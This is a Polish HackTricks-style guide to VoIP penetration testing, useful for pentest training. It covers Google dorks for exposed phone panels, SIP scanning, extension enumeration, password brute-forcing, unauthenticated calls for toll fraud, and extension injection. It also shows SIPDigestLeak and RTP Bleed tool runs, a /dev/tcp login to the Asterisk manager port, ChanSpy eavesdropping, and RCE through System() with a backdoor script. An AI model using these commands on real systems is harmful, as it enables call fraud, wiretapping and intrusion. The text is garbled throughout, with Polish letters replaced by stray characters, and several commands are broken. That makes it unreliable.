# Testowanie penetracyjne VoIP

<details>

<summary><strong>Naucz si hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) **i** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **repozytori贸w GitHub.**

</details>

## Podstawowe informacje o VoIP

Aby zacz uczy si, jak dziaa VoIP, sprawd藕:

{% content-ref url="basic-voip-protocols/" %}
[basic-voip-protocols](basic-voip-protocols/)
{% endcontent-ref %}

## Wyliczanie VoIP

### Numery telefon贸w

Jednym z pierwszych krok贸w, kt贸re mo偶e podj Red Team, jest wyszukiwanie dostpnych numer贸w telefon贸w do kontaktu z firm za pomoc narzdzi OSINT, wyszukiwarek Google lub przeszukiwania stron internetowych.

Po uzyskaniu numer贸w telefon贸w mo偶na u偶y usug online do identyfikacji operatora:

* [https://www.numberingplans.com/?page=analysis\&sub=phonenr](https://www.numberingplans.com/?page=analysis\&sub=phonenr)
* [https://mobilenumbertracker.com/](https://mobilenumbertracker.com/)
* [https://www.whitepages.com/](https://www.whitepages.com/)
* [https://www.twilio.com/lookup](https://www.twilio.com/lookup)

Dziki informacji, czy operator wiadczy usugi VoIP, mo偶na zidentyfikowa, czy firma korzysta z VoIP... Ponadto mo偶liwe jest, 偶e firma nie zatrudnia usug VoIP, ale korzysta z kart PSTN do podczenia wasnej centrali VoIP do tradycyjnej sieci telefonicznej.

Rzeczy takie jak automatyczne odpowiedzi lub muzyka zwykle wskazuj na korzystanie z VoIP. 

### Google Dorks
```bash
# Grandstream phones
intitle:"Grandstream Device Configuration" Password
intitle:"Grandstream Device Configuration" (intext:password & intext:"Grandstream Device Configuration" & intext:"Grandstream Networks" | inurl:cgi-bin) -.com|org

# Cisco Callmanager
inurl:"ccmuser/logon.asp"
intitle:"Cisco CallManager User Options Log On" "Please enter your User ID and Password in the spaces provided below and click the Log On button"

# Cisco phones
inurl:"NetworkConfiguration" cisco

# Linksys phones
intitle:"Sipura SPA Configuration"

# Snom phones
intitle:"snom" intext:"Welcome to Your Phone!" inurl:line_login.htm

# Polycom SoundPoint IP & phones
intitle:"SoundPoint IP Configuration Utility - Registration"
"Welcome to Polycom Web Configuration Utility" "Login as" "Password"
intext: "Welcome to Polycom Web Configuration Utility" intitle:"Polycom - Configuration Utility" inurl:"coreConf.htm"
intitle:"Polycom Login" inurl:"/login.html"
intitle:"Polycom Login" -.com

# Elastix
intitle:"Elastix - Login page" intext:"Elastix is licensed under GPL"

# FreePBX
inurl:"maint/index.php?FreePBX" intitle: "FreePBX" intext:"FreePBX Admministration"
```
### Informacje OSINT

Jakiekolwiek inne narzdzia OSINT, kt贸re pomog zidentyfikowa u偶ywane oprogramowanie VoIP, bd przydatne dla Red Teamu.

### Wyliczanie sieci

* **`nmap`** jest zdolny do skanowania usug UDP, ale ze wzgldu na ilo skanowanych usug UDP, jest bardzo wolny i mo偶e nie by zbyt dokadny w przypadku tego rodzaju usug.
* **`svmap`** z SIPVicious (`sudo apt install sipvicious`): Zlokalizuje usugi SIP w podanej sieci.
* `svmap` jest **atwy do zablokowania**, poniewa偶 u偶ywa User-Agenta `friendly-scanner`, ale mo偶na zmodyfikowa kod z `/usr/share/sipvicious/sipvicious` i go zmieni.
```bash
# Use --fp to fingerprint the services
svmap 10.10.0.0/24 -p 5060-5070 [--fp]
```
* **`sipscan.py`** z [**sippts**](https://github.com/Pepelux/sippts)**:** Sipscan to bardzo szybkie narzdzie do skanowania usug SIP przez UDP, TCP lub TLS. Wykorzystuje wielowtkowo i mo偶e skanowa du偶e zakresy sieci. Pozwala atwo okreli zakres port贸w, skanowa zar贸wno TCP, jak i UDP, u偶ywa innej metody (domylnie u偶ywa OPTIONS) oraz okrela inny User-Agent (i wicej).
```bash
./sipscan.py -i 10.10.0.0/24 -p all -r 5060-5080 -th 200 -ua Cisco [-m REGISTER]

[!] IP/Network: 10.10.0.0/24
[!] Port range: 5060-5080
[!] Protocol: UDP, TCP, TLS
[!] Method to scan: REGISTER
[!] Customized User-Agent: Cisco
[!] Used threads: 200

```
* **metasploit**:

Metasploit jest jednym z najpopularniejszych narzdzi do testowania penetracyjnego, kt贸re jest szeroko stosowane w rodowiskach VoIP. Metasploit zapewnia wiele modu贸w i exploit贸w, kt贸re mog by wykorzystane do atakowania i testowania zabezpiecze system贸w VoIP. Narzdzie to umo偶liwia r贸wnie偶 automatyzacj procesu testowania penetracyjnego, co przyspiesza proces identyfikacji podatnoci i ich wykorzystania. Metasploit jest niezwykle pot偶nym narzdziem, kt贸re mo偶e by wykorzystane zar贸wno przez haker贸w, jak i przez profesjonalist贸w ds. bezpieczestwa do testowania i zabezpieczania system贸w VoIP.
```
auxiliary/scanner/sip/options_tcp normal  No     SIP Endpoint Scanner (TCP)
auxiliary/scanner/sip/options     normal  No     SIP Endpoint Scanner (UDP)
```
#### Dodatkowe wyliczanie sieciowe

PBX mo偶e r贸wnie偶 ujawnia inne usugi sieciowe, takie jak:

* **69/UDP (TFTP)**: Aktualizacje oprogramowania
* **80 (HTTP) / 443 (HTTPS)**: Zarzdzanie urzdzeniem za pomoc sieci
* **389 (LDAP)**: Alternatywne przechowywanie informacji o u偶ytkownikach
* **3306 (MySQL**): Baza danych MySQL
* **5038 (Manager)**: Umo偶liwia korzystanie z Asterisk z innych platform
* **5222 (XMPP)**: Wiadomoci za pomoc Jabbera
* **5432 (PostgreSQL)**: Baza danych PostgreSQL
* I inne...

### Wyliczanie metod

Mo偶na znale藕 **dostpne metody** do u偶ycia w PBX za pomoc `sipenumerate.py` z [**sippts**](https://github.com/Pepelux/sippts)
```bash
python3 sipenumerate.py -i 10.10.0.10 -r 5080
```
### Wyliczanie rozszerze

Rozszerzenia w systemie PBX (Private Branch Exchange) odnosz si do **unikalnych wewntrznych identyfikator贸w przypisanych do poszczeg贸lnych** linii telefonicznych, urzdze lub u偶ytkownik贸w w organizacji lub firmie. Rozszerzenia umo偶liwiaj **efektywne przekierowywanie pocze wewntrz organizacji**, bez koniecznoci posiadania indywidualnych zewntrznych numer贸w telefon贸w dla ka偶dego u偶ytkownika lub urzdzenia.

* **`svwar`** z SIPVicious (`sudo apt install sipvicious`): `svwar` to darmowe narzdzie do skanowania linii rozszerze SIP PBX. W koncepcji dziaa podobnie do tradycyjnych wardialer贸w, **pr贸buje zgadywa zakres rozszerze lub podan list rozszerze**.
```bash
svwar 10.10.0.10 -p5060 -e100-300 -m REGISTER
```
* **`sipextend.py`** z [**sippts**](https://github.com/Pepelux/sippts)**:** Sipexten identyfikuje rozszerzenia na serwerze SIP. Sipexten mo偶e sprawdza du偶e sieci i zakresy port贸w.
```bash
python3 sipexten.py -i 10.10.0.10 -r 5080 -e 100-200
```
* **metasploit**: Mo偶esz r贸wnie偶 wylicza rozszerzenia/nazwy u偶ytkownik贸w za pomoc metasploita:
```
auxiliary/scanner/sip/enumerator_tcp  normal  No     SIP Username Enumerator (TCP)
auxiliary/scanner/sip/enumerator      normal  No     SIP Username Enumerator (UDP)
```
* **`enumiax` (`apt install enumiax`): enumIAX** to narzdzie do **przeamywania hase metod brute-force** dla protokou Inter Asterisk Exchange (IAX). enumIAX mo偶e dziaa w dw贸ch r贸偶nych trybach: Sekwencyjne Pr贸by Odgadywania Nazwy U偶ytkownika lub Atak Sownikowy.
```bash
enumiax -d /usr/share/wordlists/metasploit/unix_users.txt 10.10.0.10 # Use dictionary
enumiax -v -m3 -M3 10.10.0.10
```
## Ataki na VoIP

### Brute Force hasa

Po odkryciu **PBX** i niekt贸rych **rozszerze/nazw u偶ytkownik贸w**, Zesp贸 Czerwony mo偶e spr贸bowa **uwierzytelni si za pomoc metody `REGISTER`** do rozszerzenia, u偶ywajc sownika popularnych hase do przeprowadzenia ataku brute force na uwierzytelnienie.

{% hint style="danger" %}
Nale偶y zauwa偶y, 偶e **nazwa u偶ytkownika** mo偶e by taka sama jak rozszerzenie, ale ta praktyka mo偶e si r贸偶ni w zale偶noci od systemu PBX, jego konfiguracji i preferencji organizacji...

Jeli nazwa u偶ytkownika nie jest taka sama jak rozszerzenie, bdziesz musia **ustali nazw u偶ytkownika, aby przeprowadzi atak brute force**.
{% endhint %}

* **`svcrack`** z SIPVicious (`sudo apt install sipvicious`): SVCrack pozwala na zamanie hasa dla okrelonej nazwy u偶ytkownika/rozszerzenia na PBX.
```bash
svcrack -u100 -d dictionary.txt udp://10.0.0.1:5080 #Crack known username
svcrack -u100 -r1-9999 -z4 10.0.0.1 #Check username in extensions
```
* **`sipcrack.py`** z [**sippts**](https://github.com/Pepelux/sippts)**:** SIP Digest Crack to narzdzie do amania uwierzytelnienia Digest w protokole SIP.

{% code overflow="wrap" %}
```bash
python3 siprcrack.py -i 10.10.0.10 -r 5080 -e 100,101,103-105 -w wordlist/rockyou.txt
```
{% endcode %}

* **Metasploit**:
* [https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack.rb](https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack.rb)
* [https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack\_tcp.rb](https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack\_tcp.rb)

### Podsuchiwanie VoIP

Jeli znajdziesz sprzt VoIP w **otwartej sieci Wi-Fi**, mo偶esz **podslucha wszystkie informacje**. Ponadto, jeli jeste w bardziej zamknitej sieci (podczony przez Ethernet lub chronion sie Wi-Fi), mo偶esz przeprowadzi ataki **MitM, takie jak** [**ARPspoofing**](../../generic-methodologies-and-resources/pentesting-network/#arp-spoofing) midzy **PBX a bramk** w celu podsuchiwania informacji.

Wr贸d informacji sieciowych mo偶esz znale藕 **dane uwierzytelniajce do zarzdzania sprztem**, **rozszerzenia u偶ytkownik贸w**, **nazwy u偶ytkownik贸w**, **adresy IP**, nawet **zaszyfrowane hasa** i **pakiety RTP**, kt贸re mo偶na odtworzy, aby **sucha rozmowy**, i wiele wicej.

Aby uzyska te informacje, mo偶esz u偶y narzdzi takich jak Wireshark, tcpdump... ale **specjalnie stworzone narzdzie do podsuchiwania rozm贸w VoIP to** [**ucsniff**](https://github.com/Seabreg/ucsniff).

{% hint style="danger" %}
Zauwa偶, 偶e jeli **w komunikacji SIP u偶ywane jest TLS**, nie bdziesz w stanie zobaczy komunikacji SIP w czystej postaci.\
To samo bdzie miao miejsce, jeli u偶ywane s **SRTP** i **ZRTP**, **pakiety RTP nie bd w czystym tekcie**.
{% endhint %}

#### Dane uwierzytelniajce SIP

[Sprawd藕 ten przykad, aby lepiej zrozumie **komunikacj SIP REGISTER**](basic-voip-protocols/sip-session-initiation-protocol.md#sip-register-example) i dowiedz si, jak s **wysyane dane uwierzytelniajce**.

* **`sipdump`** & **`sipcrack`,** cz **sipcrack** (`apt-get install sipcrack`): Te narzdzia mog **wydoby** z **pcap** **uwierzytelnienia digest** w protokole SIP i **przeprowadzi atak bruteforce** na nie.
```bash
sipdump -p net-capture.pcap sip-creds.txt
sipcrack sip-creds.txt -w dict.txt
```
* **`siptshar.py`, `sipdump.py`, `sipcrack.py`** z [**sippts**](https://github.com/Pepelux/sippts)**:**
* **SipTshark** wyodrbnia dane protokou SIP z pliku PCAP.
* **SipDump** wyodrbnia uwierzytelnienia SIP Digest z pliku PCAP.
* **SIP Digest Crack** to narzdzie do amania uwierzytelnienia Digest w protokole SIP.
```bash
python3 siptshark.py -f captura3.pcap [-filter auth]
python3 sipdump.py -f captura3.pcap -o data.txt
python3 sipcrack.py -f data.txt -w wordlist/rockyou.txt
```
#### Kody DTMF

Nie tylko dane uwierzytelniajce SIP mog by znalezione w ruchu sieciowym, mo偶liwe jest r贸wnie偶 znalezienie kod贸w DTMF, kt贸re s u偶ywane na przykad do dostpu do poczty gosowej.\
Mo偶liwe jest wysanie tych kod贸w w wiadomociach SIP INFO, w formacie audio lub wewntrz pakiet贸w RTP. Jeli kody znajduj si w pakietach RTP, mo偶na je wyci z tej czci rozmowy i u偶y narzdzia multimo do ich wyodrbnienia:
```bash
multimon -a DTMF -t wac pin.wav
```
### Darmowe poczenia / Bdy konfiguracji pocze Asterisk

W Asterisku istnieje mo偶liwo zezwolenia na poczenie **z okrelonego adresu IP** lub z **dowolnego adresu IP**:
```
host=10.10.10.10
host=dynamic
```
Jeli podany jest adres IP, host **nie bdzie musia wysya 偶da REGISTER** co jaki czas (w pakiecie REGISTER wysyany jest czas 偶ycia, zazwyczaj 30 minut, co oznacza, 偶e w innym scenariuszu telefon bdzie musia si REJESTROWA co 30 minut). Jednak偶e, musi mie otwarte porty umo偶liwiajce poczenia z serwerem VoIP w celu odbierania pocze.

Aby zdefiniowa u偶ytkownik贸w, mo偶na ich zdefiniowa jako:

* **`type=user`**: U偶ytkownik mo偶e tylko odbiera poczenia jako u偶ytkownik.
* **`type=friend`**: Mo偶liwe jest wykonywanie pocze jako peer i odbieranie ich jako u偶ytkownik (u偶ywane z rozszerzeniami).
* **`type=peer`**: Mo偶liwe jest wysyanie i odbieranie pocze jako peer (SIP-trunks).

Mo偶liwe jest r贸wnie偶 ustanowienie zaufania za pomoc zmiennej insecure:

* **`insecure=port`**: Umo偶liwia poczenia peer, kt贸re s uwierzytelniane przez IP.
* **`insecure=invite`**: Nie wymaga uwierzytelniania dla wiadomoci INVITE.
* **`insecure=port,invite`**: Oba.

{% hint style="warning" %}
Kiedy u偶ywane jest **`type=friend`**, **warto** zmiennej **host** **nie bdzie u偶ywana**, wic jeli administrator **bdnie skonfiguruje SIP-trunk** u偶ywajc tej wartoci, **ka偶dy bdzie m贸g si do niego podczy**.

Na przykad, taka konfiguracja byaby podatna na ataki:\
`host=10.10.10.10`\
`insecure=port,invite`\
`type=friend`
{% endhint %}

### Darmowe poczenia / Bdy konfiguracji kontekstu w Asterisk

W Asterisku **kontekst** to nazwany kontener lub sekcja w planie wybierania, kt贸ry **grupuje powizane rozszerzenia, akcje i reguy**. Plan wybierania jest podstawowym komponentem systemu Asterisk, poniewa偶 definiuje **spos贸b obsugi i kierowania przychodzcych i wychodzcych pocze**. Konteksty s u偶ywane do organizacji planu wybierania, zarzdzania kontrol dostpu i zapewnienia separacji midzy r贸偶nymi czciami systemu.

Ka偶dy kontekst jest zdefiniowany w pliku konfiguracyjnym, zwykle w pliku **`extensions.conf`**. Konteksty s oznaczane przez nawiasy kwadratowe, a nazwa kontekstu jest zamknita w nich. Na przykad:
```bash
csharpCopy code[my_context]
```
W kontekcie definiuje si rozszerzenia (wzorce numer贸w wybieranych) i przypisuje im szereg dziaa lub aplikacji. Te dziaania okrelaj, w jaki spos贸b jest przetwarzane poczenie. Na przykad:
```scss
[my_context]
exten => 100,1,Answer()
exten => 100,n,Playback(welcome)
exten => 100,n,Hangup()
```
Ten przykad przedstawia prosty kontekst o nazwie "my\_context" z rozszerzeniem "100". Gdy kto wybierze numer 100, poczenie zostanie odebrane, odtworzony zostanie komunikat powitalny, a nastpnie poczenie zostanie zakoczone.

To jest **inny kontekst**, kt贸ry umo偶liwia **wybieranie dowolnego innego numeru**:
```scss
[external]
exten => _X.,1,Dial(SIP/trunk/${EXTEN})
```
Jeli administrator definiuje **domylny kontekst** jako:
```
[default]
include => my_context
include => external
```
{% hint style="warning" %}
Ka偶dy bdzie m贸g u偶ywa **serwera do dzwonienia na dowolny numer** (a administrator serwera bdzie paci za poczenie).
{% endhint %}

{% hint style="danger" %}
Co wicej, domylnie plik **`sip.conf`** zawiera **`allowguest=true`**, wic **dowolny** atakujcy **bez uwierzytelnienia** bdzie m贸g dzwoni na dowolny numer.
{% endhint %}

*   **`sipinvite.py`** z [**sippts**](https://github.com/Pepelux/sippts)**:** Sipinvite sprawdza, czy serwer PBX pozwala nam na wykonywanie pocze bez uwierzytelnienia. Jeli serwer SIP ma nieprawidow konfiguracj, pozwoli nam na wykonywanie pocze do zewntrznych numer贸w. Mo偶e r贸wnie偶 umo偶liwi nam przekierowanie poczenia na drugi zewntrzny numer.

Na przykad, jeli tw贸j serwer Asterisk ma z konfiguracj kontekstu, mo偶esz akceptowa 偶dania INVITE bez autoryzacji. W tym przypadku atakujcy mo偶e dzwoni, nie znajc 偶adnego u偶ytkownika/hasa.

{% code overflow="wrap" %}
```bash
# Trying to make a call to the number 555555555 (without auth) with source number 200.
python3 sipinvite.py -i  10.10.0.10 -fu 200 -tu 555555555 -v

# Trying to make a call to the number 555555555 (without auth) and transfer it to number 444444444.
python3 sipinvite.py -i 10.10.0.10 -tu 555555555 -t 444444444
```
{% endcode %}

### Darmowe poczenia / 殴le skonfigurowane IVRS

IVRS oznacza **Interactive Voice Response System**, technologi telefoniczn, kt贸ra umo偶liwia u偶ytkownikom interakcj z zautomatyzowanym systemem za pomoc gosu lub klawiszy. IVRS su偶y do budowy **automatycznych system贸w obsugi pocze**, kt贸re oferuj r贸偶ne funkcje, takie jak udzielanie informacji, kierowanie pocze i zbieranie danych od u偶ytkownik贸w.

Typowy system IVRS w systemach VoIP skada si z:

1. **Komunikat贸w gosowych**: Wstpnie nagranych wiadomoci audio, kt贸re prowadz u偶ytkownik贸w przez opcje i instrukcje menu IVR.
2. **Sygnalizacji DTMF** (Dual-Tone Multi-Frequency): Sygnay generowane przez nacinicie klawiszy na telefonie, kt贸re su偶 do nawigacji po menu IVR i wprowadzania danych.
3. **Kierowania pocze**: Przekierowywanie pocze do odpowiedniego miejsca, takiego jak konkretne dziay, agenci lub numery wewntrzne, na podstawie danych wprowadzonych przez u偶ytkownika.
4. **Zbierania danych od u偶ytkownik贸w**: Pobieranie informacji od dzwonicych, takich jak numery kont, identyfikatory spraw lub inne istotne dane.
5. **Integracji z systemami zewntrznymi**: Poczenie systemu IVR z bazami danych lub innymi systemami oprogramowania w celu uzyskiwania dostpu do informacji, aktualizacji danych, wykonywania dziaa lub wywoywania zdarze.

W systemie Asterisk VoIP mo偶na utworzy IVR za pomoc planu wybierania (**plik `extensions.conf`**) i r贸偶nych aplikacji, takich jak `Background()`, `Playback()`, `Read()` i inne. Te aplikacje umo偶liwiaj odtwarzanie komunikat贸w gosowych, zbieranie danych od u偶ytkownik贸w i kontrolowanie przepywu poczenia.

#### Przykad podatnej konfiguracji
```scss
exten => 0,100,Read(numbers,the_call,,,,5)
exten => 0,101,GotoIf("$[${numbers}"="1"]?200)
exten => 0,102,GotoIf("$[${numbers}"="2"]?300)
exten => 0,103,GotoIf("$[${numbers}"=""]?100)
exten => 0,104,Dial(LOCAL/${numbers})
```
Poprzedni przykad pokazuje, 偶e u偶ytkownik jest proszony o **nacinicie 1, aby zadzwoni** do jednego dziau, **2, aby zadzwoni** do innego dziau, lub **peny numer wewntrzny**, jeli go zna.\
Podatno polega na tym, 偶e **nie jest sprawdzana dugo podanego numeru wewntrznego, wic u偶ytkownik mo偶e wprowadzi peny numer wewntrzny w czasie 5 sekund i zostanie on wybrany.**

### Wstrzyknicie numeru wewntrznego

U偶ywajc numeru wewntrznego, takiego jak:
```scss
exten => _X.,1,Dial(SIP/${EXTEN})
```
Gdzie **`${EXTEN}`** to **numer wewntrzny**, kt贸ry zostanie wybrany, gdy zostanie wprowadzone **ext 101**, oto co by si stao:
```scss
exten => 101,1,Dial(SIP/101)
```
Jednak偶e, jeli **`${EXTEN}`** pozwala na wprowadzanie **czego innego ni偶 liczby** (jak w starszych wersjach Asteriska), atakujcy m贸gby wprowadzi **`101&SIP123123123`** aby zadzwoni pod numer telefonu 123123123. A to byby wynik:
```scss
exten => 101&SIP123123123,1,Dial(SIP/101&SIP123123123)
```
Dlatego te偶, poczenie do rozszerzenia **`101`** i **`123123123`** zostanie wysane i tylko pierwsze z nich, kt贸re otrzyma poczenie, zostanie nawizane... ale jeli atakujcy u偶yje **rozszerzenia, kt贸re omija dopasowanie** i nie istnieje, mo偶e **wstrzykn poczenie tylko do wybranego numeru**.

## SIPDigestLeak

SIP Digest Leak to podatno, kt贸ra dotyczy du偶ej liczby telefon贸w SIP, w tym zar贸wno sprztowych, jak i oprogramowania IP, a tak偶e adapter贸w telefonicznych (VoIP do analogowego). Podatno ta umo偶liwia **wyciek odpowiedzi uwierzytelniania Digest**, kt贸ra jest obliczana na podstawie hasa. Nastpnie mo偶liwy jest **atak offline na haso**, kt贸ry pozwala odzyska wikszo hase na podstawie odpowiedzi na wyzwanie.

**[Scenariusz podatnoci odnajdziesz tutaj**](https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf):

1. Telefon IP (ofiara) nasuchuje na porcie 5060 i akceptuje poczenia telefoniczne.
2. Atakujcy wysya INVITE do telefonu IP.
3. Telefon ofiary zaczyna dzwoni, a kto odbiera i rozcza si (poniewa偶 nikt nie odbiera telefonu po drugiej stronie).
4. Po rozczeniu telefon ofiary wysya BYE do atakujcego.
5. Atakujcy wysya odpowied藕 407, kt贸ra **wymaga uwierzytelnienia** i wywouje wyzwanie uwierzytelniania.
6. Telefon ofiary odpowiada na wyzwanie uwierzytelniania w drugim BYE.
7. Atakujcy mo偶e wtedy przeprowadzi atak brute-force na odpowied藕 na wyzwanie na swoim lokalnym komputerze (lub w sieci rozproszonej itp.) i zgadn haso.

* **sipdigestleak.py** z [**sippts**](https://github.com/Pepelux/sippts)**:** SipDigestLeak wykorzystuje t podatno.
```bash
python3 sipdigestleak.py -i 10.10.0.10

[!] Target: 10.10.0.10:5060/UDP
[!] Caller: 100
[!] Callee: 100

[=>] Request INVITE
[<=] Response 100 Trying
[<=] Response 180 Ringing
[<=] Response 200 OK
[=>] Request ACK
... waiting for BYE ...
[<=] Received BYE
[=>] Request 407 Proxy Authentication Required
[<=] Received BYE with digest
[=>] Request 200 Ok

Auth=Digest username="pepelux", realm="asterisk", nonce="lcwnqoz0", uri="sip:100@10.10.0.10:56583;transport=UDP", response="31fece0d4ff6fd524c1d4c9482e99bb2", algorithm=MD5
```
### Click2Call

Click2Call umo偶liwia **u偶ytkownikowi sieci web** (kt贸ry na przykad mo偶e by zainteresowany produktem) **wprowadzenie** swojego **numeru telefonu** w celu otrzymania poczenia. Nastpnie zostanie wykonane poczenie z reklam, a gdy u偶ytkownik **odezwie si przez telefon**, zostanie **poczony z agentem**.

Wsp贸lny profil Asterisk dla tego celu to:
```scss
[web_user]
secret = complex_password
deny = 0.0.0.0/0.0.0.0
allow = 0.0.0.0/0.0.0.0
displayconnects = yes
read = system,call,log,verbose,agent,user,config,dtmf,reporting,crd,diapla
write = system,call,agent,user,config,command,reporting,originate
```
* Poprzedni profil umo偶liwia **POCZENIE Z KA呕DYM ADRESEM IP** (jeli znane jest haso).
* Aby **zorganizowa poczenie**, jak wczeniej okrelono, **nie jest wymagane uprawnienie do odczytu**, a jedynie uprawnienie do **tworzenia** w trybie **zapisu**.

Z tymi uprawnieniami ka偶de IP, znajc haso, mogoby si poczy i wydoby zbyt wiele informacji, takich jak:

{% code overflow="wrap" %}
```bash
# Get all the peers
exec 3<>/dev/tcp/10.10.10.10/5038 && echo -e "Action: Login\nUsername:test\nSecret:password\nEvents: off\n\nAction:Command\nCommand: sip show peers\n\nAction: logoff\n\n">&3 && cat <&3
```
{% endcode %}

**Wicej informacji lub dziaa mo偶e by wymaganych.**

### **Podsluchiwanie**

W Asterisku mo偶liwe jest u偶ycie polecenia **`ChanSpy`**, wskazujcego **rozszerzenie(y) do monitorowania** (lub wszystkie), aby podsucha rozmowy, kt贸re si odbywaj. To polecenie musi by przypisane do rozszerzenia.

Na przykad, **`exten => 333,1,ChanSpy('all',qb)`** oznacza, 偶e jeli **zadzwonisz** na **rozszerzenie 333**, bdzie ono **monitorowa** **`wszystkie`** rozszerzenia, **rozpoczynajc nasuchiwanie** za ka偶dym razem, gdy rozpocznie si nowa rozmowa (**`b`**) w trybie cichym (**`q`**), poniewa偶 nie chcemy na ni wpywa. Mo偶esz przej z jednej trwajcej rozmowy do drugiej, naciskajc **`*`**, lub oznaczajc numer rozszerzenia.

Mo偶liwe jest r贸wnie偶 u偶ycie **`ExtenSpy`**, aby monitorowa tylko jedno rozszerzenie.

Zamiast sucha rozm贸w, mo偶na je **nagrywa w plikach** za pomoc rozszerzenia, takiego jak:

{% code overflow="wrap" %}
```scss
[recorded-context]
exten => _X.,1,Set(NAME=/tmp/${CONTEXT}_${EXTEN}_${CALLERID(num)}_${UNIQUEID}.wav)
exten => _X.,2,MixMonitor(${NAME})
```
{% endcode %}

Poczenia zostan zapisane w **`/tmp`**.

Mo偶esz nawet zmusi Asterisk do **wykonania skryptu, kt贸ry ujawni poczenie** po jego zamkniciu.
```scss
exten => h,1,System(/tmp/leak_conv.sh &)
```
### RTCPBleed

**RTCPBleed** to powa偶ny problem zwizany z bezpieczestwem, kt贸ry dotyczy serwer贸w VoIP opartych na Asterisku (opublikowany w 2017 roku). Podatno ta umo偶liwia **przechwycenie i przekierowanie ruchu RTP (Real Time Protocol)**, kt贸ry przenosi rozmowy VoIP, przez dowoln osob w Internecie. Dzieje si tak, poniewa偶 ruch RTP omija uwierzytelnianie podczas przechodzenia przez zapory NAT (Network Address Translation).

Proksy RTP pr贸buj rozwiza **ograniczenia NAT** wpywajce na systemy RTC, przekazujc strumienie RTP midzy dwiema lub wicej stronami. Gdy NAT jest w u偶yciu, oprogramowanie proxy RTP czsto nie mo偶e polega na informacjach o adresie IP i porcie RTP pobranych za pomoc sygnalizacji (np. SIP). Dlatego wiele proxy RTP wprowadzio mechanizm, w kt贸rym takie **krotki IP i portu s automatycznie poznawane**. Czsto jest to realizowane poprzez analiz przychodzcego ruchu RTP i oznaczanie adresu IP i portu 藕r贸dowego dla ka偶dego przychodzcego ruchu RTP jako adresu, na kt贸ry nale偶y odpowiedzie. Ten mechanizm, kt贸ry mo偶e by nazywany "trybem nauki", **nie wykorzystuje 偶adnej formy uwierzytelniania**. Dlatego **atakujcy** mog **wysya ruch RTP do proxy RTP** i otrzymywa ruch RTP przekazywany do prawowitych u偶ytkownik贸w rozmowy RTP. Nazywamy t podatno RTP Bleed, poniewa偶 umo偶liwia atakujcym otrzymywanie strumieni multimedialnych RTP, kt贸re s przeznaczone dla prawowitych u偶ytkownik贸w.

Innym interesujcym zachowaniem proxy RTP i stos贸w RTP jest to, 偶e czasami, **nawet jeli nie s podatne na RTP Bleed**, akceptuj, przekazuj i/lub przetwarzaj pakiety RTP z dowolnego 藕r贸da. Dlatego atakujcy mog wysya pakiety RTP, kt贸re pozwalaj im wstrzykiwa swoje dane multimedialne zamiast prawowitych. Nazywamy ten atak wstrzykiwaniem RTP, poniewa偶 umo偶liwia wstrzykiwanie nieprawowitych pakiet贸w RTP do istniejcych strumieni RTP. Ta podatno mo偶e wystpowa zar贸wno w proxy RTP, jak i w punktach kocowych.

Asterisk i FreePBX tradycyjnie u偶ywaj ustawienia **`NAT=yes`**, kt贸re umo偶liwia omijanie uwierzytelniania ruchu RTP, co potencjalnie prowadzi do braku d藕wiku lub jednostronnego d藕wiku podczas rozm贸w.

Wicej informacji mo偶na znale藕 na stronie [https://www.rtpbleed.com/](https://www.rtpbleed.com/)

* **`rtpbleed.py`** z [**sippts**](https://github.com/Pepelux/sippts)**:** Wykrywa podatno RTP Bleed, wysyajc strumienie RTP.
```bash
python3 rtpbleed.py -i 10.10.0.10
```
* **`rtcpbleed.py`** z [**sippts**](https://github.com/Pepelux/sippts)**:** Wykrywa podatno na wyciek RTP, wysyajc strumienie RTP
```bash
python3 rtcpbleed.py -i 10.10.0.10
```
* **`rtpbleedflood.py`** z [**sippts**](https://github.com/Pepelux/sippts)**:** Wykorzystuje podatno RTP Bleed, wysyajc strumienie RTP
```bash
python3 rtpbleedflood.py -i 10.10.0.10 -p 10070 -v
```
* **`rtpbleedinject.py`** z [**sippts**](https://github.com/Pepelux/sippts)**:** Wykorzystuje podatno RTP Bleed, wysyajc strumienie RTP (z pliku audio)
```bash
python3 rtpbleedinject.py -i 10.10.0.10 -p 10070 -f audio.wav
```
### RCE

W Asterisku w jaki spos贸b udaje ci si **doda reguy rozszerze i je przeadowa** (na przykad poprzez skompromitowanie podatnego serwera zarzdzajcego sieci), mo偶liwe jest uzyskanie RCE za pomoc polecenia **`System`**.
```scss
same => n,System(echo "Called at $(date)" >> /tmp/call_log.txt)
```
Istnieje polecenie o nazwie **`Shell`**, kt贸re mo偶na u偶y **zamiast `System`** do wykonania polece systemowych, jeli jest to konieczne.

{% hint style="warning" %}
Jeli serwer **nie zezwala na u偶ycie pewnych znak贸w** w poleceniu **`System`** (jak w przypadku Elastix), sprawd藕, czy serwer sieciowy pozwala na **tworzenie plik贸w w systemie** (jak w przypadku Elastix lub trixbox) i u偶yj go do **utworzenia skryptu backdoor** a nastpnie u偶yj **`System`** do **wykonania** tego **skryptu**.
{% endhint %}

#### Interesujce lokalne pliki i uprawnienia

* **`sip.conf`** -> Zawiera haso u偶ytkownik贸w SIP.
* Jeli serwer **Asterisk dziaa jako root**, mo偶na przej kontrol nad rootem.
* **U偶ytkownik root mysql** mo偶e **nie mie hasa**.
